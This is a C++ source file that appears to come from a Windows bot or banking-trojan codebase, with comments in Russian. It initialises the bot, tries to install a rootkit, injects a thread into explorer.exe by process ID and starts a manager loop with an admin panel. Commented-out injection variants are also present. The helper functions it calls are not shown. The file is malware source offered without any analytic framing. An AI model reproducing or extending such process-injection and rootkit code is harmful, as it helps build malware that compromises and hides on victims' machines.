#include "main.h"
#include "core\file.h"
#include "core\socket.h"
#include "AdminPanel.h"
#include "Manager.h"
#include "task.h"
#include "service.h"


void ExplorerLoop( bool runAdminPanel )
{
//Если стартуем с InjectToExplorer32(), то инициализация не нужна
	InitBot();
	DbgMsg( "Стартанули в explorer.exe, UID=%s", Config::UID );
	if( !InitRootkit() )
	{
		DbgMsg( "Rootkit не установился" );
	}
	Pipe::InitServerPipeResponse();
	ManagerLoop(runAdminPanel);
}

DWORD WINAPI ExplorerEntry( void* )
{
	ExplorerLoop(true);
	return 0;
}

DWORD WINAPI ExplorerEntryFromService( void* )
{
	ExplorerLoop(false);
	return 0;
}

bool WaitRunExplorer()
{
	for( int i = 0; i < 300; i++ )
		if( Process::GetExplorerPID() )
			return true;
		else
			Delay(100);
	return false;
}

void RunInExplorer2( SIZE_T param )
{
//	return InjectToExplorer32(func);
	DWORD pid = Process::GetExplorerPID();
	if( pid )
	{
		SetInjectPID(pid);
		InjectIntoProcess2( pid, (typeFuncThread)param );
	}
}

bool RunInExplorer( typeFuncThread func )
{
//	return InjectCrossRootkit( RunInExplorer2, (DWORD)func );
/*
	DWORD pid = Process::GetExplorerPID();
	Process::Kill( pid, 5000 );
	return Process::Exec( "explorer.exe" );
*/
/*
//	return InjectToExplorer32(func);
	DWORD pid = Process::GetExplorerPID();
	if( pid )
	{
		SetInjectPID(pid);
		return InjectIntoProcess2( pid, func );
	}
*/
	return false;
}

